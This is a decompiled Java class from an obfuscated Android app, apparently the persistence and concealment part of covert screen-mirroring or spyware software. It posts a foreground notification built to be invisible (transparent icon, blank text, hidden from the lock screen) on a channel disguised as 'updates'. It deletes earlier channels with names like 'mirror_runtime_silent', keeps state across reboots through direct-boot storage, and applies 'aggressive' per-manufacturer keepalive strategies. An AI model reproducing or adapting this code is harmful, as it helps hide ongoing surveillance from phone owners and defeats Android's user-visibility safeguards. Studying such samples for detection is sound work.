// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package c2;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.PowerManager;
import android.text.TextUtils;
import android.util.Log;
import com.os9sp.yfwkcq0dwfxaf.R;
import java.util.concurrent.TimeUnit;
import w1.j4;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public abstract class u {

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public static PowerManager.WakeLock f460a;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public static final Object f461b = new Object();

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public static final String[] f462c = {"mirror_runtime", "screen_mirror", "mirror_runtime_silent", "mirror_runtime_service_v2", "network_connection_silent_v4"};

    public static SharedPreferences a(Context context, String str) {
        if (context == null || !p.k(context)) {
            return null;
        }
        SharedPreferences sharedPreferencesE = p.e(context, str);
        if (q(sharedPreferencesE)) {
            return sharedPreferencesE;
        }
        return null;
    }

    public static Notification b(Service service) {
        e(service);
        Notification.Builder builder = new Notification.Builder(service, "updates");
        builder.setSmallIcon(R.drawable.ic_transparent).setContentTitle(" ").setContentText(" ").setGroup("silent").setOngoing(true).setAutoCancel(false).setOnlyAlertOnce(true).setShowWhen(false).setLocalOnly(true);
        builder.setPriority(Build.VERSION.SDK_INT >= 33 ? -1 : -2);
        builder.setVisibility(-1);
        Notification notificationBuild = builder.build();
        notificationBuild.flags |= 256;
        return notificationBuild;
    }

    public static SharedPreferences c(Context context) {
        k kVar = k.f436a;
        if (context == null) {
            return kVar;
        }
        try {
            Context applicationContext = context.getApplicationContext();
            if (applicationContext != null) {
                context = applicationContext;
            }
            Context contextCreateDeviceProtectedStorageContext = context.createDeviceProtectedStorageContext();
            if (contextCreateDeviceProtectedStorageContext != null) {
                context = contextCreateDeviceProtectedStorageContext;
            }
            SharedPreferences sharedPreferences = context.getSharedPreferences("keepalive_direct_boot", 0);
            return sharedPreferences != null ? sharedPreferences : kVar;
        } catch (Throwable unused) {
        }
    }

    public static void d(Context context) {
        if (context == null) {
            return;
        }
        try {
            Context applicationContext = context.getApplicationContext();
            if (applicationContext == null) {
                return;
            }
            int i3 = 1;
            if (j4.a(applicationContext) == 1) {
                p.n nVar = new p.n();
                TimeUnit.SECONDS.getClass();
                nVar.f2857a = true;
                y.o oVar = nVar.f2859c;
                oVar.f6010l = 2;
                String str = y.o.f5998u;
                oVar.f6011m = y.f.f(10000L, 10000L, 18000000L);
                p.t tVar = (p.t) nVar.a();
                q.q qVarA = q.q.a(applicationContext);
                y.c cVar = new y.c(8);
                ((z.l) qVarA.f3058d.f6032a).execute(new q.r(qVarA, cVar, new m2.k(tVar, qVarA, cVar, i3), tVar, 0));
            }
        } catch (Throwable th) {
            Log.w("KeepaliveWork", "enqueue failed", th);
        }
    }

    public static void e(ContextWrapper contextWrapper) {
        NotificationManager notificationManager = (NotificationManager) contextWrapper.getSystemService(NotificationManager.class);
        if (notificationManager == null) {
            return;
        }
        for (int i3 = 0; i3 < 5; i3++) {
            notificationManager.deleteNotificationChannel(f462c[i3]);
        }
        int[] iArr = p.f453f;
        for (int i4 = 0; i4 < 7; i4++) {
            notificationManager.cancel(iArr[i4]);
        }
        NotificationChannel notificationChannel = new NotificationChannel("updates", "updates", 1);
        notificationChannel.setDescription(" ");
        notificationChannel.setShowBadge(false);
        notificationChannel.enableLights(false);
        notificationChannel.enableVibration(false);
        notificationChannel.setSound(null, null);
        notificationChannel.setLockscreenVisibility(-1);
        notificationChannel.setAllowBubbles(false);
        notificationManager.createNotificationChannel(notificationChannel);
    }

    public static boolean f(SharedPreferences sharedPreferences, SharedPreferences sharedPreferences2, SharedPreferences.Editor editor, SharedPreferences.Editor editor2, String str) {
        boolean z2;
        boolean zContains = sharedPreferences.contains(str);
        boolean zContains2 = sharedPreferences2.contains(str);
        if (!zContains && !zContains2) {
            return false;
        }
        String strConcat = "__direct_boot_revision__".concat(str);
        long j3 = sharedPreferences.getLong(strConcat, 0L);
        long j4 = sharedPreferences2.getLong(strConcat, 0L);
        if (zContains) {
            z2 = (!zContains2 || j3 >= j4) ? sharedPreferences.getBoolean(str, false) : sharedPreferences2.getBoolean(str, false);
        } else {
            z2 = sharedPreferences2.getBoolean(str, false);
        }
        long jMax = Math.max(j3, j4);
        if (jMax <= 0) {
            jMax = Math.max(1L, System.currentTimeMillis());
        }
        editor.putBoolean(str, z2);
        editor.putLong(strConcat, jMax);
        editor2.putBoolean(str, z2);
        editor2.putLong(strConcat, jMax);
        return true;
    }

    public static boolean g(SharedPreferences sharedPreferences, SharedPreferences sharedPreferences2, SharedPreferences.Editor editor, SharedPreferences.Editor editor2, String str) {
        boolean zContains = sharedPreferences.contains(str);
        boolean zContains2 = sharedPreferences2.contains(str);
        if (!zContains && !zContains2) {
            return false;
        }
        long jMax = Math.max(zContains ? sharedPreferences.getLong(str, 0L) : 0L, zContains2 ? sharedPreferences2.getLong(str, 0L) : 0L);
        editor.putLong(str, jMax);
        editor2.putLong(str, jMax);
        return true;
    }

    public static boolean h(SharedPreferences sharedPreferences, SharedPreferences sharedPreferences2, SharedPreferences.Editor editor, SharedPreferences.Editor editor2, String str) {
        String string;
        String string2;
        boolean zContains = sharedPreferences.contains(str);
        boolean zContains2 = sharedPreferences2.contains(str);
        if (!zContains && !zContains2) {
            return false;
        }
        String strConcat = "__direct_boot_revision__".concat(str);
        long j3 = sharedPreferences.getLong(strConcat, 0L);
        long j4 = sharedPreferences2.getLong(strConcat, 0L);
        String str2 = "";
        if (!zContains || (string = sharedPreferences.getString(str, "")) == null) {
            string = "";
        }
        if (zContains2 && (string2 = sharedPreferences2.getString(str, "")) != null) {
            str2 = string2;
        }
        if (!zContains || (zContains2 && ((j3 != 0 || string.isEmpty()) && (j4 > j3 || (j3 <= j4 && string.isEmpty()))))) {
            string = str2;
        }
        long jMax = Math.max(j3, j4);
        if (jMax <= 0) {
            jMax = Math.max(1L, System.currentTimeMillis());
        }
        editor.putString(str, string);
        editor.putLong(strConcat, jMax);
        editor2.putString(str, string);
        editor2.putLong(strConcat, jMax);
        return true;
    }

    public static long i(y.c cVar, String str) {
        String strConcat = "__direct_boot_revision__".concat(str);
        long jMax = ((SharedPreferences) cVar.f5973e).getLong(strConcat, 0L);
        SharedPreferences sharedPreferences = (SharedPreferences) cVar.f5972d;
        if (sharedPreferences != null) {
            jMax = Math.max(jMax, sharedPreferences.getLong(strConcat, 0L));
        }
        if (jMax == Long.MAX_VALUE) {
            return Long.MAX_VALUE;
        }
        return Math.max(System.currentTimeMillis(), jMax + 1);
    }

    public static y.c j(Context context, String str) {
        return new y.c(a(context, str), c(context), 1);
    }

    public static void k(SharedPreferences sharedPreferences, String str, long j3, boolean z2) {
        SharedPreferences.Editor editorEdit;
        if (q(sharedPreferences) && (editorEdit = sharedPreferences.edit()) != null) {
            editorEdit.putLong(str, j3);
            if (z2) {
                editorEdit.commit();
            } else {
                editorEdit.apply();
            }
        }
    }

    public static long l(Context context, String str) {
        y.c cVarJ = j(context, "keepalive_prefs");
        SharedPreferences sharedPreferences = (SharedPreferences) cVarJ.f5973e;
        long j3 = q(sharedPreferences) ? sharedPreferences.getLong(str, 0L) : 0L;
        SharedPreferences sharedPreferences2 = (SharedPreferences) cVarJ.f5972d;
        return Math.max(j3, sharedPreferences2 != null ? sharedPreferences2.getLong(str, 0L) : 0L);
    }

    public static boolean m(Context context, String str) {
        y.c cVarJ = j(context, "keepalive_prefs");
        SharedPreferences sharedPreferences = (SharedPreferences) cVarJ.f5973e;
        SharedPreferences sharedPreferences2 = (SharedPreferences) cVarJ.f5972d;
        boolean z2 = sharedPreferences2 != null && sharedPreferences2.contains(str);
        boolean z3 = q(sharedPreferences) && sharedPreferences.contains(str);
        if (!z2 && !z3) {
            return false;
        }
        if (!z2) {
            return sharedPreferences.getBoolean(str, false);
        }
        if (z3) {
            return sharedPreferences.getLong("__direct_boot_revision__".concat(str), 0L) > sharedPreferences2.getLong("__direct_boot_revision__".concat(str), 0L) ? sharedPreferences.getBoolean(str, false) : sharedPreferences2.getBoolean(str, false);
        }
        return sharedPreferences2.getBoolean(str, false);
    }

    public static String n(Context context, String str) {
        String string;
        String string2;
        y.c cVarJ = j(context, "screen_mirror_tunnel");
        SharedPreferences sharedPreferences = (SharedPreferences) cVarJ.f5973e;
        SharedPreferences sharedPreferences2 = (SharedPreferences) cVarJ.f5972d;
        boolean z2 = false;
        boolean z3 = sharedPreferences2 != null && sharedPreferences2.contains(str);
        if (q(sharedPreferences) && sharedPreferences.contains(str)) {
            z2 = true;
        }
        String str2 = "";
        if (!z3 && !z2) {
            return "";
        }
        if (!z3 || (string = sharedPreferences2.getString(str, "")) == null) {
            string = "";
        }
        if (z2 && (string2 = sharedPreferences.getString(str, "")) != null) {
            str2 = string2;
        }
        if (z3) {
            if (z2) {
                long j3 = sharedPreferences2.getLong("__direct_boot_revision__".concat(str), 0L);
                long j4 = sharedPreferences.getLong("__direct_boot_revision__".concat(str), 0L);
                if ((j3 != 0 || string.isEmpty()) && (j4 > j3 || string.isEmpty())) {
                }
            }
            return string;
        }
        return str2;
    }

    public static String o() {
        String str = Build.MANUFACTURER;
        String lowerCase = TextUtils.isEmpty(str) ? "" : str.trim().toLowerCase();
        if (lowerCase.contains("xiaomi") || lowerCase.contains("redmi") || lowerCase.contains("poco")) {
            return "aggressive_xiaomi";
        }
        if (lowerCase.contains("vivo") || lowerCase.contains("iqoo")) {
            return "aggressive_vivo";
        }
        if (lowerCase.contains("oppo") || lowerCase.contains("realme") || lowerCase.contains("oneplus")) {
            return "aggressive_oppo";
        }
        if (lowerCase.contains("huawei") || lowerCase.contains("honor")) {
            return "aggressive_huawei";
        }
        return lowerCase.contains("samsung") ? "balanced_samsung" : "balanced_standard";
    }

    public static boolean p(Service service, int i3) {
        try {
            Notification notificationB = b(service);
            if (i3 != 0) {
                service.startForeground(1001, notificationB, i3);
                return true;
            }
            service.startForeground(1001, notificationB);
            return true;
        } catch (Throwable th) {
            StringBuilder sb = new StringBuilder("startForeground failed service=");
            sb.append(service.getClass().getSimpleName());
            sb.append(" types=");
            sb.append(i3);
            sb.append(": ");
            a0.a.p(th, sb, "SilentNotification");
            return false;
        }
    }

    public static boolean q(SharedPreferences sharedPreferences) {
        return (sharedPreferences == null || (sharedPreferences instanceof k)) ? false : true;
    }

    public static void r(Context context, String str) {
        SharedPreferences.Editor editorEdit;
        SharedPreferences.Editor editorEdit2;
        synchronized (f461b) {
            y.c cVarJ = j(context, "keepalive_prefs");
            long jI = i(cVarJ, str);
            SharedPreferences sharedPreferences = (SharedPreferences) cVarJ.f5973e;
            if (q(sharedPreferences) && (editorEdit = sharedPreferences.edit()) != null) {
                editorEdit.putBoolean(str, true);
                editorEdit.putLong("__direct_boot_revision__".concat(str), jI);
                editorEdit.apply();
            }
            SharedPreferences sharedPreferences2 = (SharedPreferences) cVarJ.f5972d;
            if (q(sharedPreferences2) && (editorEdit2 = sharedPreferences2.edit()) != null) {
                editorEdit2.putBoolean(str, true);
                editorEdit2.putLong("__direct_boot_revision__".concat(str), jI);
                editorEdit2.apply();
            }
        }
    }

    public static void s(Context context, String str, long j3) {
        synchronized (f461b) {
            y.c cVarJ = j(context, "keepalive_prefs");
            k((SharedPreferences) cVarJ.f5973e, str, j3, false);
            k((SharedPreferences) cVarJ.f5972d, str, j3, false);
        }
    }

    public static void t(Context context, String str, String str2) {
        SharedPreferences.Editor editorEdit;
        SharedPreferences.Editor editorEdit2;
        synchronized (f461b) {
            y.c cVarJ = j(context, "screen_mirror_tunnel");
            long jI = i(cVarJ, str);
            SharedPreferences sharedPreferences = (SharedPreferences) cVarJ.f5973e;
            if (q(sharedPreferences) && (editorEdit = sharedPreferences.edit()) != null) {
                editorEdit.putString(str, str2);
                editorEdit.putLong("__direct_boot_revision__".concat(str), jI);
                editorEdit.apply();
            }
            SharedPreferences sharedPreferences2 = (SharedPreferences) cVarJ.f5972d;
            if (q(sharedPreferences2) && (editorEdit2 = sharedPreferences2.edit()) != null) {
                editorEdit2.putString(str, str2);
                editorEdit2.putLong("__direct_boot_revision__".concat(str), jI);
                editorEdit2.apply();
            }
        }
    }
}
